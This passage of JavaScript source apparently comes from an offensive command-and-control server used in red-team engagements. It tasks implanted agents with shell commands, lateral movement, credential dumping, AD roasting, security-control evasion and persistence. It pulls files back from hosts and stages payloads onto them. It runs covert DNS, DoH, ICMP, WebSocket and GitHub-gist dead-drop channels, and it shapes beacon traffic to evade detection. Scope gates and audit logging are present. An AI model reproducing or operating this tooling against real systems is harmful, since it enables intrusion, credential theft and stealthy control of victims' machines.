        this._emit('task.refused', { agentId, kind: String(kind), reason });
        const err = new Error(String(kind) + ' refused: ' + reason);
        err.code = 'GOVERNANCE';
        throw err;
      };
      const gate = lateralGate(this.scope && this.scope.engagement);
      if (!gate.ok) refuse(gate.reason);
      try { lateralSpec = parseLateralSpec(kind, data); } catch (e) { refuse((e && e.message) || String(e)); }
      // SCOPE (the channel/seam CIDR discipline): lateral targets are IP literals
      // inside the signed ring — anything else is refused loudly, never queued.
      if (lateralSpec.target) {
        const sc = lateralScopeCheck(lateralSpec.target, this.scope && this.scope.cidrs, 'target');
        if (!sc.ok) refuse(sc.reason);
      }
    }
    if (CRED_KINDS.has(String(kind))) {
      const refuse = (reason) => {
        this._emit('task.refused', { agentId, kind: String(kind), reason });
        const err = new Error(String(kind) + ' refused: ' + reason);
        err.code = 'GOVERNANCE';
        throw err;
      };
      const gate = credAccessGate(this.scope && this.scope.engagement);
      if (!gate.ok) refuse(gate.reason);
      try { credSpec = parseCredSpec(kind, data); } catch (e) { refuse((e && e.message) || String(e)); }
    }
    const t = { taskId: crypto.randomUUID(), kind: String(kind || 'shell'), data: String(data ?? ''), queuedAt: Date.now(), deliveredAt: null, resultAt: null, resultPreview: null };
    a.tasks.push(t);
    a.ledger.set(t.taskId, t);
    while (a.tasks.length > MAX_TASKS) a.tasks.shift();
    if (a.ledger.size > MAX_TASKS) a.ledger.delete(a.ledger.keys().next().value);
    this._emit('task.queued', { agentId, taskId: t.taskId, kind: t.kind });
    if (inlineSpec) this._emit('exec.inline-dotnet', { agentId, taskId: t.taskId, sha256: inlineSpec.sha256, bytes: inlineSpec.bytes.length, entryPoint: inlineSpec.entryPoint || null });
    if (evasionSpec) {
      const recipes = {};
      for (const tech of evasionSpec.techniques || EVASION_TECHNIQUES) recipes[tech] = { dll: EVASION_RECIPES[tech].dll, export: EVASION_RECIPES[tech].export, recipeSha256: EVASION_RECIPES[tech].recipeSha256 };
      this._emit('evasion.task', { agentId, taskId: t.taskId, kind: t.kind, techniques: evasionSpec.techniques, recipes });
    }
    if (persistSpec) {
      this._emit('persist.task', { agentId, taskId: t.taskId, kind: t.kind, techniques: persistSpec.techniques, name: persistSpec.name || null, overwrite: persistSpec.overwrite === true, all: persistSpec.all === true, deep: persistSpec.deep || null, prove: persistSpec.prove === true, specSha256: persistSpecSha256(persistSpec) });
    }
    if (proxySpec) {
      this._emit('execproxy.task', { agentId, taskId: t.taskId, kind: t.kind, technique: proxySpec.technique, name: proxySpec.name || null, export: proxySpec.export || null, all: proxySpec.all === true, specSha256: execProxySpecSha256(proxySpec) });
    }
    if (roastSpec) {
      this._emit('adroast.task', { agentId, taskId: t.taskId, kind: t.kind, dc: roastSpec.dc, realm: roastSpec.realm || null, accounts: roastSpec.accounts ? roastSpec.accounts.length : (roastSpec.requests ? roastSpec.requests.length : null), specSha256: adRoastSpecSha256(roastSpec) });
    }
    if (lateralSpec) {
      // The password NEVER rides the audit event; the command is pinned by hash only.
      this._emit('lateral.task', { agentId, taskId: t.taskId, kind: t.kind, adapter: lateralSpec.adapter || null, target: lateralSpec.target || null, user: lateralSpec.user || null, name: lateralSpec.name || null, all: lateralSpec.all === true, specSha256: lateralSpecSha256(lateralSpec) });
    }
    if (credSpec) {
      this._emit('cred.task', { agentId, taskId: t.taskId, kind: t.kind, name: credSpec.name || null, pid: credSpec.pid ?? null, all: credSpec.all === true, specSha256: credSpecSha256(credSpec) });
    }
    // gap#4: the ws PUSH wire delivers the instant a task is queued - no polling cadence
    // (polling periodicity is the beacon signal this transport exists to kill).
    if (a._ws && a._ws.open) this._wsFlush(a);
    return t.taskId;
  }

  // Broadcast (group tasking): every live agent, or a tagged subset. Returns [{agentId, taskId}].
  taskWhere({ tag, all } = {}, kind, data) {
    const out = [];
    for (const a of this.agents.values()) {
      if (a.killed) continue;
      if (!all && tag && !a.tags.includes(String(tag).toLowerCase())) continue;
      if (!all && !tag) continue; // refuse an accidental empty broadcast
      const taskId = this.task(a.agentId, kind, data);
      if (taskId) out.push({ agentId: a.agentId, taskId });
    }
    if (out.length) this._emit('task.broadcast', { tag: tag || (all ? 'ALL' : null), kind: String(kind || 'shell'), agents: out.length });
    return out;
  }

  // Drain (optionally taskId-filtered) results for an agent.
  results(agentId, { taskId } = {}) {
    const a = this.agents.get(agentId);
    if (!a) return [];
    const matched = [], keep = [];
    for (const r of a.results) (taskId && r.taskId !== taskId ? keep : matched).push(r);
    a.results = keep;
    return matched;
  }

  // Kill-list an agent: future check-ins are 204-uniform rejections (Fang's trick — a
  // killed agent looks EXACTLY like an idle one to any observer).
  kill(agentId) {
    const a = this.agents.get(agentId);
    if (a) { a.killed = true; a.tasks = []; this._emit('agent.killed', { agentId }); }
  }

  // ——— Artifact staging (push/pull) ———
  // Stage a file FOR an agent: queued as a 'stage' task carrying name+bytes+sha256 — the
  // agent verifies the hash on receipt, so a truncated/tampered delivery can't execute.
  stageArtifact(agentId, name, dataBuf) {
    const a = this.agents.get(agentId);
    if (!a || a.killed) return null;
    const buf = Buffer.isBuffer(dataBuf) ? dataBuf : Buffer.from(String(dataBuf ?? ''), 'utf8');
    if (!buf.length) throw new TypeError('stageArtifact: empty artifact');
    if (buf.length > MAX_ARTIFACT_BYTES) throw new TypeError('stageArtifact: artifact exceeds the ' + MAX_ARTIFACT_BYTES + '-byte cap');
    const fname = String(name || 'artifact').replace(/[^\w.-]/g, '_').slice(0, 80);
    const hash = sha256(buf);
    const payload = JSON.stringify({ name: fname, sha256: hash, b64: buf.toString('base64') });
    const taskId = this.task(agentId, 'stage', payload);
    if (!taskId) return null;
    const art = { id: crypto.randomUUID(), direction: 'push', name: fname, agentId, bytes: buf.length, sha256: hash, at: new Date().toISOString(), taskId, data: buf };
    this._artifactStore(art);
    this._emit('artifact.staged', { agentId, name: fname, bytes: buf.length, sha256: hash.slice(0, 12) });
    return { taskId, artifactId: art.id, sha256: hash };
  }

  // Ask an agent to PULL a file back: a 'fetch' task; the result registers as an artifact.
  fetchArtifact(agentId, path) {
    const taskId = this.task(agentId, 'fetch', JSON.stringify({ path: String(path || '').slice(0, 300) }));
    return taskId;
  }

  _artifactStore(art) {
    if (!this._artifacts) this._artifacts = new Map();
    this._artifacts.set(art.id, art);
    while (this._artifacts.size > MAX_ARTIFACTS) this._artifacts.delete(this._artifacts.keys().next().value);
  }
  artifacts() {
    if (!this._artifacts) return [];
    return [...this._artifacts.values()].map((a) => ({ ...a, data: undefined }));
  }
  artifact(id) {
    return this._artifacts && this._artifacts.get(id) ? this._artifacts.get(id).data : null;
  }

  // Result intake: marks the task resulted in the ledger; 'fetch' results register artifacts.
  _intakeResult(a, taskId, body) {
    const t = a.ledger.get(taskId);
    if (t) { t.resultAt = Date.now(); t.resultPreview = body.toString('utf8').replace(/\s+/g, ' ').slice(0, 120); }
    if (t && t.kind === 'fetch') {
      let path = '';
      try { path = JSON.parse(t.data).path; } catch {}
      const hash = sha256(body);
      this._artifactStore({ id: crypto.randomUUID(), direction: 'pull', name: String(path).split(/[\\/]/).pop() || 'fetch', agentId: a.agentId, bytes: body.length, sha256: hash, at: new Date().toISOString(), taskId, data: body });
      this._emit('artifact.received', { agentId: a.agentId, path, bytes: body.length, sha256: hash.slice(0, 12) });
    }
    // EVASION TIER audit (the accountability trail): an evasion result that parses as
    // evidence JSON lands its per-technique ORIGINAL+PATCHED (and restored) sha256 plus
    // the verification booleans in the audit stream — 'evasion.applied' /
    // 'evasion.restored' / 'evasion.status'. A refusal text or unparseable body emits
    // nothing here (no event is ever fabricated from unverifiable data; the ledger
    // preview still carries the raw text).
    if (t && EVASION_KINDS.has(t.kind)) {
      const ev = parseEvasionEvidence(body);
      if (ev) this._emit(ev.event, { agentId: a.agentId, taskId, ...ev.fields });
    }
    // PERSISTENCE TIER audit (the accountability trail): a persist result that parses as
    // evidence JSON lands its per-technique location + targetSha256 + verification
    // booleans in the audit stream — 'persist.installed' / 'persist.removed' /
    // 'persist.status' / 'persist.sweep'. A removal that could not verify flips the
    // event to 'persist.remove-failed' with escalated:true — the loud operator
    // escalation, never a buried boolean. Refusal text / unparseable bodies emit
    // nothing here (no event is fabricated from unverifiable data; the ledger preview
    // still carries the raw text).
    if (t && PERSIST_KINDS.has(t.kind)) {
      const ev = parsePersistEvidence(body);
      if (ev) this._emit(ev.event, { agentId: a.agentId, taskId, ...ev.fields });
    }
    // SIGNED-PROXY EXECUTION TIER audit (the accountability trail): an execproxy
    // result that parses as evidence JSON lands its per-name technique + command +
    // the sha256 of EVERY file planted/executed plus the verification booleans in
    // the audit stream — 'execproxy.ran' / 'execproxy.removed' / 'execproxy.status'.
    // A removal that could not verify flips the event to 'execproxy.remove-failed'
    // with escalated:true — the loud operator escalation, never a buried boolean.
    if (t && EXECPROXY_KINDS.has(t.kind)) {
      const ev = parseExecProxyEvidence(body);
      if (ev) this._emit(ev.event, { agentId: a.agentId, taskId, ...ev.fields });
    }
    // AD TIER audit (the accountability trail). Roast: 'adroast.collected' carries the
    // formatted hashcat/john lines (the engagement's crack-material deliverable) plus
    // the per-account metadata the attack-path graph ingests. Lateral: 'lateral.ran' /
    // 'lateral.removed' / 'lateral.remove-failed' (escalated) / 'lateral.status' carry
    // the artifact manifest + verification booleans — never the password, never the
    // output tail. Cred: 'cred.dumped' / 'cred.dump-removed' / 'cred.dump-remove-failed'
    // (escalated) / 'cred.dump-status' carry the dump's sha256 + marker verdict +
    // removal booleans — never a byte of dump content.
    if (t && ADROAST_KINDS.has(t.kind)) {
      const ev = parseAdRoastEvidence(body);
      if (ev) this._emit(ev.event, { agentId: a.agentId, taskId, ...ev.fields });
    }
    if (t && LATERAL_KINDS.has(t.kind)) {
      const ev = parseLateralEvidence(body);
      if (ev) this._emit(ev.event, { agentId: a.agentId, taskId, ...ev.fields });
    }
    if (t && CRED_KINDS.has(t.kind)) {
      const ev = parseCredEvidence(body);
      if (ev) this._emit(ev.event, { agentId: a.agentId, taskId, ...ev.fields });
    }
  }

  // Transport tagging (gap#5): every OBSERVED (auth-passed, seq-accepted) check-in is
  // counted against the transport it arrived on; the codec transports normalize to the
  // fleet vocabulary ('dns-codec' -> 'dns'). Rejected check-ins never reach this - a tag
  // is evidence of a governed round trip. This is also the ONLY place assignedTransport
  // may flip to 'active': the channel asked, and the agent demonstrably came on that wire.
  // Buckets materialize lazily from KNOWN_TRANSPORTS (gap#2 added 'doh') so a fresh
  // agent's view keeps the legacy {http,dns,icmp} shape until a wire is observed.
  // gap#6: this seam is also where the flow-beacon ring is fed - it fires on EVERY
  // accepted check-in/push across all five transports, so { t, bytes } lands here.
  // bytes = the application bytes THIS event carried inbound (0 for bare pulls and the
  // ws connect; result-body/chunk length for pushes). Response sizes are not measured
  // at this seam, so beaconscore reports sizeCV null (no evidence) for pull-only flows
  // rather than a fabricated number.
  _tagTransport(a, transport, bytes = 0) {
    if (!a.transportCheckins) return;
    const t = transport === 'dns-codec' ? 'dns' : String(transport || '');
    if (!KNOWN_TRANSPORTS.has(t)) return;
    if (!Object.prototype.hasOwnProperty.call(a.transportCheckins, t)) a.transportCheckins[t] = 0;
    a.transportCheckins[t]++;
    a.transportLastSeen[t] = Date.now();
    a.lastTransport = t;
    if (!a.flowTimes) a.flowTimes = [];
    a.flowTimes.push({ t: Date.now(), bytes: Math.max(0, Number(bytes) || 0), wire: t }); // wire: per-transport self-measurement (failover ranking, shaping pack pt.4)
    while (a.flowTimes.length > MAX_FLOW_EVENTS) a.flowTimes.shift();
    if (a.assignedTransport && a.assignedTransport.state === 'assigned' && a.assignedTransport.transport === t) {
      a.assignedTransport.state = 'active';
      this._emit('agent.transport-active', { agentId: a.agentId, transport: t });
    }
  }

  // Agent health from checkin recency (the fleet view's heartbeat column).
  _health(a, nowMs) {
    if (a.killed) return 'killed';
    if (!a.lastSeen) return 'registered';
    const dt = nowMs - a.lastSeen;
    return dt < 60_000 ? 'active' : dt < 5 * 60_000 ? 'stale' : 'quiet';
  }

  agentsView({ now } = {}) {
    const n = now || Date.now();
    return [...this.agents.values()].map((a) => ({
      agentId: a.agentId, label: a.label, tags: a.tags.slice(), health: this._health(a, n),
      profile: a.profile ? a.profile.label : null,
      shape: a.shape ? a.shape.name : null, // shaping pack v2: the applied wire-shape profile (null = 'plain', today's shape)
      checkins: a.checkins, lastSeen: a.lastSeen || null, remoteIp: a.remoteIp, killed: a.killed,
      pendingTasks: a.tasks.length, bufferedResults: a.results.length,
      // Envelope encryption (engine/envelope): true once the agent has PROVEN enc
      // capability (authenticated ec:1 flag or a sealed chunk that opened).
      enc: a.enc === true,
      // Pivot mesh (gap#4b): set when this agent is a LINKED child — { parent, link, pipe }.
      via: a.via ? { ...a.via } : null,
      // Transport failover view (gap#5). transportGrade is computed at READ time against
      // the agent's own cadence (its malleable profile intervalMs when set, else 5000ms).
      // Delivery-HEALTH only, never a detectability claim (see engine/transport-grade).
      lastTransport: a.lastTransport || null,
      transportCheckins: { ...(a.transportCheckins || {}) },
      transportLastSeen: { ...(a.transportLastSeen || {}) },
      assignedTransport: a.assignedTransport ? { ...a.assignedTransport } : null,
      transportGrade: gradeAgentTransports(a, { now: n, expectedMs: (a.profile && a.profile.intervalMs) || 5000 }),
      // Flow-beacon self-score (gap#6), read-time over the flowTimes ring. Feature
      // evidence against published detector features, never a detectability verdict
      // (see engine/beaconscore's honesty contract).
      flowScore: this._flowScore(a),
      // Oracle-graded adaptive failover (shaping pack part 4): the per-wire preference
      // ranking — delivery health + measured per-wire beacon score + success history,
      // eligibility-gated, operator pin wins. Recommendation only, never auto-applied.
      failover: this.failoverPlan(a.agentId, { now: n }),
      // TLS inspection (lose-point #5): tlsInspect = the measured egress POSTURE pushed
      // channel-side by the probe (setTlsInspection); tlsi = this agent's OWN reported
      // channel-handshake verdict (additive check-in metadata, x-varvel-tlsi) — the
      // agent's observation, never listener-verified proof.
      tlsInspect: this.tlsInspect ? { posture: this.tlsInspect.posture, policy: this._tlsPolicy(), at: this.tlsInspect.at } : null,
      tlsi: a.tlsi ? { ...a.tlsi } : null,
    }));
  }

  // gap#6: read-time flow-beacon score over an agent record's ring, shared by agentsView
  // and the /api/channel/flow route. mode 'push' when the last observed wire is ws - a
  // push channel holds no polling cadence, so gap regularity is never fabricated for it.
  _flowScore(a) {
    const ring = (a.flowTimes || []).filter((e) => e && Number.isFinite(Number(e.t)));
    return scoreFlow({
      times: ring.map((e) => Number(e.t)),
      sizes: ring.map((e) => Math.max(0, Number(e.bytes) || 0)),
      mode: a.lastTransport === 'ws' ? 'push' : 'poll',
    });
  }

  // The /api/channel/flow route backing: the full scoreFlow result for one agent
  // (features + flagged + note), or null when the agent does not exist (route -> 404).
  flowView(agentId) {
    const a = this.agents.get(agentId);
    if (!a) return null;
    return { agentId: a.agentId, events: (a.flowTimes || []).length, ...this._flowScore(a) };
  }

  // ——— Shaping pack: batch/dwell windows + padding (parts 1-2) ———
  // A task queued while its agent has a batch window is HELD until the seeded flush
  // point of the window it landed in (engine/malleable.windowFlushAt — HMAC-derived
  // from the shared token, so channel and agent compute the SAME point without
  // coordination). No batch window = deliverable immediately (today's behavior).
  _taskDeliverable(a, t, nowMs) {
    if (!a.shape || !a.shape.batch) return true;
    const w = windowIndexAt(a.shapeAt, a.shape.batch.windowMs, t.queuedAt);
    return nowMs >= windowFlushAt(a.token, a.shapeAt, a.shape.batch.windowMs, w);
  }

  // Drain the deliverable PREFIX of the task queue (deliverability is monotonic in
  // queuedAt, so held tasks always form a suffix). cap 1 = the legacy single-task pull;
  // batch agents flush the window's held tasks as ONE burst (cap 16 — overflow waits
  // for the next window, honestly documented).
  _drainDeliverable(a, nowMs, cap = 1) {
    const out = [];
    while (a.tasks.length && out.length < cap) {
      const t = a.tasks[0];
      if (!this._taskDeliverable(a, t, nowMs)) break;
      a.tasks.shift();
      t.deliveredAt = nowMs;
      out.push(t);
    }
    return out;
  }

  // Per-wire flow score: the flow ring sliced to ONE transport, scored read-time.
  // Fewer than 12 points on a wire = beaconscore's own fail-closed 'insufficient-data'
  // — the failover ranking treats that as NO shape evidence (never a fabricated 0).
  _wireScore(a, wire) {
    const ring = (a.flowTimes || []).filter((e) => e && e.wire === wire && Number.isFinite(Number(e.t)));
    return scoreFlow({
      times: ring.map((e) => Number(e.t)),
      sizes: ring.map((e) => Math.max(0, Number(e.bytes) || 0)),
      mode: wire === 'ws' ? 'push' : 'poll',
    });
  }

  // ORACLE-GRADED ADAPTIVE FAILOVER (shaping pack part 4): the per-wire preference
  // ranking for one agent — delivery health (transport-grade) + MEASURED per-wire
  // beacon score (the flow ring) + success history, ranked by engine/transport-grade
  // rankTransports. Read-time, pure composition, null for unknown agents.
  //   Eligibility (fail-closed): ghc only with an attached mailbox client, smb only
  //   for link-enrolled children, doh/icmp only when those arms are live. An operator
  //   pin (assignedTransport) always wins — the ranking is computed but the
  //   recommendation refuses to move off it. Never auto-applies: the recommendation
  //   surfaces here and in the cli; the switch itself rides setTransport (audited).
  failoverPlan(agentId, { now, threshold } = {}) {
    const a = this.agents.get(agentId);
    if (!a) return null;
    const n = Number.isFinite(Number(now)) ? Number(now) : Date.now();
    const expectedMs = (a.shape && a.shape.cadence && a.shape.cadence.intervalMs) || (a.profile && a.profile.intervalMs) || 5000;
    const grades = gradeAgentTransports(a, { now: n, expectedMs });
    const wireScores = {};
    for (const t of KNOWN_TRANSPORTS) wireScores[t] = this._wireScore(a, t);
    const eligible = {
      http: true, dns: true, ws: true, // this server's own routes are always serveable
      doh: !!(this._doh && this._doh.armed),
      icmp: !!(this._icmp && this._icmp.armed),
      smb: !!a.via,
      ghc: !!this.ghc,
      stg: !!this.stg, // the image routes live on this server too — serveable whenever armed
    };
    const plan = rankTransports({
      grades, wireScores, checkins: a.transportCheckins || {}, eligible,
      pinned: a.assignedTransport ? a.assignedTransport.transport : null,
      current: a.lastTransport, threshold,
      // TLS-inspection adaptation (lose-point #5): the measured egress posture folds in
      // as a scored factor; the policy is read LIVE from the engagement settings.
      inspection: this.tlsInspect ? { posture: this.tlsInspect.posture, policy: this._tlsPolicy() } : null,
    });
    return { agentId, expectedMs, ...plan };
  }

  // The /api/channel/tradecraft route backing (gap#7): the agent's SHELL-kind task
  // stream from the ledger - chronological, FULL data strings (tasksView truncates at
  // 80 chars; the long-line density tell needs the whole line) plus queuedAt stamps -
  // graded at read time by engine/agentsig. Signatures + evidence only, never a vendor
  // verdict. null when the agent does not exist (route -> 404).
  tradecraftView(agentId) {
    const a = this.agents.get(agentId);
    if (!a) return null;
    const shell = [...a.ledger.values()].filter((t) => t.kind === 'shell').sort((x, y) => x.queuedAt - y.queuedAt);
    return { agentId: a.agentId, shellTasks: shell.length, ...analyzeCommandStream(shell.map((t) => t.data), { times: shell.map((t) => t.queuedAt) }) };
  }

  // The Cobalt-style task ledger for one agent: queued → delivered → resulted.
  tasksView(agentId) {
    const a = this.agents.get(agentId);
    if (!a) return [];
    return [...a.ledger.values()].map((t) => ({
      taskId: t.taskId, kind: t.kind, data: t.kind === 'stage' ? '(artifact)' : t.data.slice(0, 80),
      status: t.resultAt ? 'resulted' : t.deliveredAt ? 'delivered' : 'queued',
      queuedAt: t.queuedAt, deliveredAt: t.deliveredAt, resultAt: t.resultAt, resultPreview: t.resultPreview,
    })).sort((x, y) => y.queuedAt - x.queuedAt);
  }

  async arm(port = 0) {
    if (this.server) return { port: this.port };
    this.server = http.createServer((req, res) => this._handle(req, res));
    // Agent connections die mid-flight all the time (timeouts, range resets) — never let a
    // socket error take the channel down with it. Guard: double-destroy asserts on win32 libuv.
    this.server.on('clientError', (e, sock) => { try { if (sock && !sock.destroyed) sock.destroy(); } catch {} });
    // gap#4 ws PUSH transport: upgrades on /ws ONLY are terminated here (plain /c /r /d
    // traffic is untouched - the request path never sees these). Any other upgrade path
    // is destroyed: nothing else on this server consumes upgrades.
    this.server.on('upgrade', (req, socket, head) => this._handleUpgrade(req, socket, head));
    await new Promise((resolve, reject) => {
      this.server.once('error', reject);
      this.server.listen(port, this.bind, resolve);
    });
    this.port = this.server.address().port;
    // Real DNS-over-UDP wire transport (same payloads, same governance as the /d route).
    // DUAL-BIND (the 2026-08-04 follow-up, shipped): udp4 AND udp6 side by side on the
    // same port, identical governed intake. Each family binds INDEPENDENTLY — a family
    // that cannot bind (a v6-only host, a v4-only host, no honest v6 counterpart for a
    // specific v4 bind) is a NAMED gap ('dns.bind-gap'), never a crash; the wire serves
    // on whatever family the host actually has. BOTH failing still refuses the arm: a
    // DNS transport that serves nothing is a lie. The udp6 socket is ipv6Only — the udp4
    // socket owns v4, so no v4-mapped shadowing and no EADDRINUSE on the '::' dual-bind.
    if (this.dnsPort > 0) {
      let armed4 = false, armed6 = false;
      try {
        this._dnsSock = await this._bindDnsSocket('udp4', this.bind);
        armed4 = true;
        this._emit('channel.dns-armed', { bind: this.bind, port: this.dnsPort, domain: this.dnsDomain });
      } catch (e) {
        this._emit('dns.bind-gap', { family: 'udp4', bind: this.bind, error: (e && e.message) || String(e) });
      }
      const v6Bind = dnsV6Counterpart(this.bind);
      if (v6Bind) {
        try {
          this._dnsSock6 = await this._bindDnsSocket({ type: 'udp6', ipv6Only: true }, v6Bind);
          armed6 = true;
          this._emit('channel.dns6-armed', { bind: v6Bind, port: this.dnsPort, domain: this.dnsDomain });
        } catch (e) {
          this._emit('dns.bind-gap', { family: 'udp6', bind: v6Bind, error: (e && e.message) || String(e) });
        }
      } else {
        this._emit('dns.bind-gap', { family: 'udp6', bind: this.bind, error: 'no v6 counterpart for this bind — v4-only DNS wire (a specific v4 NIC bind never expands to ::)' });
      }
      if (!armed4 && !armed6) {
        throw new Error('CallbackChannel: DNS wire requested (dnsPort ' + this.dnsPort + ') but neither udp4 nor udp6 could bind — see the dns.bind-gap audit events');
      }
    }
    // DoH (gap#2): RFC 8484 https transport — the same governed wire packets, TLS-carried.
    if (this.doh) await this._armDoh();
    // ICMP fallback transport: spawn the native raw-socket bridge (real termination).
    // Async by design — capability/frames arrive as bridge stdout events; if the bridge
    // reports unsupported the channel stays up on HTTP/DNS and says so honestly.
    if (this.icmp) this._armIcmp();
    // ghc cloud/SaaS dead-drop: start the jittered mailbox poll when attached with a
    // cadence (intervalSec 0 = manual; tests/embedders drive ghcPollNow() themselves).
    if (this.ghc && this.ghc.intervalSec > 0) this._armGhcTimer();
    this._emit('channel.armed', { bind: this.bind, port: this.port });
    return { port: this.port };
  }

  // One governed DNS UDP socket, bound: scope-ring silent drop → the shared wire reply →
  // the answer leaves from the SAME socket it arrived on (a v6 query is answered on the
  // v6 socket). A bind failure rejects AND closes the half-bound socket — the caller
  // names it as a per-family gap, no handle leaks.
  _bindDnsSocket(type, bindAddr) {
    const sock = dgram.createSocket(type);
    sock.on('error', (e) => this._emit('dns.error', { error: e.message }));
    sock.on('message', (msg, rinfo) => {
      try {
        if (!ipAllowed(rinfo.address || '', this.scope.cidrs)) return; // silent drop (UDP: no reply at all out of scope)
        const out = this._dnsWireReply(msg, rinfo.address);
        if (out) sock.send(out, rinfo.port, rinfo.address, () => {});
      } catch (e) { this._emit('dns.error', { error: (e && e.message) || String(e) }); }
    });
    return new Promise((resolve, reject) => {
      sock.once('error', (e) => { try { sock.close(); } catch {} reject(e); });
      sock.bind(this.dnsPort, bindAddr, () => resolve(sock));
    });
  }

  async disarm() {
    if (!this.server || this._closing) return;
    this._closing = true;
    // gap#4: upgraded ws sockets are detached from the http server's tracking - destroy
    // them explicitly or disarm would leave live sessions behind.
    for (const s of this._wsSessions) { try { s.socket.destroy(); } catch {} }
    this._wsSessions.clear();
    try { if (this._dnsSock) { this._dnsSock.close(); this._dnsSock = null; } } catch {}
    try { if (this._dnsSock6) { this._dnsSock6.close(); this._dnsSock6 = null; } } catch {}
    if (this._icmpCapTimer) { clearTimeout(this._icmpCapTimer); this._icmpCapTimer = null; }
    try { if (this._icmpChild) { this._icmpChild.kill(); this._icmpChild = null; } } catch {}
    // ghc: stop the mailbox poll timer (the attachment config survives a disarm, exactly
    // like this.doh — re-arm restarts the cadence from the same cursor).
    if (this._ghc && this._ghc.timer) { try { clearTimeout(this._ghc.timer); } catch {} this._ghc.timer = null; }
    if (this._dohServer) {
      const s = this._dohServer;
      this._dohServer = null;
      if (this._doh) this._doh.armed = false;
      try { if (s.closeAllConnections) s.closeAllConnections(); } catch {}
      try { await new Promise((r) => s.close(r)); } catch { /* already closing */ }
    }
    try { await new Promise((r) => this.server.close(r)); } catch { /* already closing */ }
    this.server = null;
    this._closing = false;
    this._emit('channel.disarmed', {});
  }

  // Live DoH transport status — the honest, observed truth about the https arm, for the
  // /api/channel view: configured/armed/port + certSource ('provided' | 'lab').
  dohStatus() {
    if (!this.doh) return { configured: false };
    return { configured: true, ...this._doh };
  }

  // Live stg transport status — configured/profile/geometry + the frame capacity the
  // geometry yields + serve counters. The capacity number IS the wire's honest bandwidth
  // ceiling per image (low — this is a fallback wire, never a primary).
  stgStatus() {
    if (!this.stg) return { configured: false };
    return { configured: true, ...this.stg, capacityBytes: stgCapacity(this.stg), ...this._stg };
  }

  // Live envelope-encryption status (engine/envelope): the resolved mode plus the
  // per-agent capability tally (enc-proven vs plaintext-only vs unknown).
  encStatus() {
    let proven = 0, plain = 0;
    for (const a of this.agents.values()) (a.enc === true ? proven++ : plain++);
    return { mode: this.encMode, agents: { enc: proven, plaintext: plain } };
  }

  // --- ghc: cloud/SaaS dead-drop transport (GitHub gist-comment mailbox, engine/ghc2) ---
  // The agent NEVER connects to this channel: both sides rendezvous in the gist's comment
  // list. Channel-side we poll the mailbox, feed each up-envelope through the SHARED
  // governed intake (_dnsPayload — HMAC/strict-seq/kill-list/reassembly unchanged), and
  // post the intake's reply back as a signed down-comment. The SCOPE-RING ip check does
  // not apply on this wire — there is no source socket to ring-check; the per-agent HMAC
  // + strict seq + kill-list IS the whole boundary (documented honestly). The token never
  // reaches this class: the client object holds it; events carry byte counts + rate
  // headers only.
  // Dial host:port THROUGH the configured upstream proxy, reusing ghost's openTunnel —
  // the in-repo, audited SOCKS5h/HTTP-CONNECT client (no new handshake code). EVERY
  // failure is wrapped in the NAMED error and NOTHING ever falls back to a direct dial:
  // a configured proxy that cannot carry the leg fails the leg (fail-closed — a stealth
  // configuration must not leak). The message names scheme/host/port, NEVER credentials.
  async _dialUpstream(host, port, timeoutMs = 15000) {
    const hop = this.upstreamProxy;
    try {
      return await openTunnel([hop], host, port, timeoutMs);
    } catch (e) {
      throw new UpstreamProxyError(
        'upstream proxy ' + hop.scheme + '://' + hop.host + ':' + hop.port + ' cannot carry ' + host + ':' + port +
        ' — ' + ((e && e.message) || e) + ' (fail-closed: no direct fallback)', { cause: e });
    }
  }

  // http(s) agents whose EVERY connection dials through the upstream proxy — the
  // threading seam for an attached mailbox client (Ghc2Api's `agents` knob). null when
  // unconfigured: the caller then leaves the client untouched (byte-identical behavior).
  _upstreamAgents() {
    if (!this.upstreamProxy) return null;
    const dialHttp = (opts, cb) => {
      const host = opts.host || opts.hostname;
      this._dialUpstream(host, Number(opts.port) || 80).then((s) => cb(null, s), cb);
    };
    const dialHttps = (opts, cb) => {
      const host = opts.host || opts.hostname;
      this._dialUpstream(host, Number(opts.port) || 443).then((socket) => {
        const t = tls.connect({ socket, servername: net.isIP(host) ? undefined : host, rejectUnauthorized: opts.rejectUnauthorized !== false }, () => cb(null, t));
        t.once('error', (e) => cb(e));
      }, cb);
    };
    return { httpAgent: new UpstreamHttpAgent(dialHttp), httpsAgent: new UpstreamHttpsAgent(dialHttps) };
  }

  attachGhc({ client, intervalSec = GHC2_RATE.defaultIntervalSec } = {}) {
    if (!client || typeof client.listComments !== 'function' || typeof client.createComment !== 'function') {
      throw new TypeError('attachGhc: client must implement listComments()/createComment() (see engine/ghc2 Ghc2Api)');
    }
    // LISTENER UPSTREAM PROXY: the mailbox leg is the listener's own upstream dial — when
    // a proxy is configured it MUST carry this leg. The threading seam is the client's
    // `agents` knob (Ghc2Api; the ghost-chain idiom). A client WITHOUT that seam cannot be
    // proxied — attaching it anyway would silently direct-connect, so the attach REFUSES
    // with the named error BEFORE any state changes (fail-closed, never a stealth leak).
    if (this.upstreamProxy && !('agents' in client)) {
      throw new UpstreamProxyError('an upstream proxy IS configured (' + this.upstreamProxySource + ') but the attached ghc client has no agents seam to ride — attach REFUSED: the mailbox leg must never silently direct-connect');
    }
    this.detachGhc();
    this.ghc = { client, intervalSec: Math.max(0, Number(intervalSec) || 0) };
    this._ghc = { cursor: 0, timer: null, busy: false, polls: 0, lastPoll: null, byAgent: new Map(), upstreamProxy: null };
    if (this.upstreamProxy) {
      client.agents = this._upstreamAgents();
      // The status/audit view carries scheme/host/port/source only — proxy CREDENTIALS
      // are never rendered (the ghost status doctrine).
      this._ghc.upstreamProxy = { applied: true, scheme: this.upstreamProxy.scheme, host: this.upstreamProxy.host, port: this.upstreamProxy.port, source: this.upstreamProxySource };
      this._emit('channel.upstream-proxy', { leg: 'ghc-mailbox', applied: true, scheme: this.upstreamProxy.scheme, host: this.upstreamProxy.host, port: this.upstreamProxy.port, source: this.upstreamProxySource });
    }
    this._emit('channel.ghc-armed', { intervalSec: this.ghc.intervalSec, cadence: this.ghc.intervalSec > 0 ? 'timer' : 'manual' });
    if (this.server && this.ghc.intervalSec > 0) this._armGhcTimer();
    return this.ghcStatus();
  }

  detachGhc() {
    if (this._ghc && this._ghc.timer) { try { clearTimeout(this._ghc.timer); } catch { /* already fired */ } }
    this.ghc = null;
    this._ghc = null;
  }

  ghcStatus() {
    if (!this.ghc) return { configured: false };
    return {
      configured: true,
      intervalSec: this.ghc.intervalSec,
      polling: !!(this._ghc && this._ghc.timer),
      cursor: this._ghc ? this._ghc.cursor : 0,
      byAgent: this._ghc ? Object.fromEntries(this._ghc.byAgent) : {},
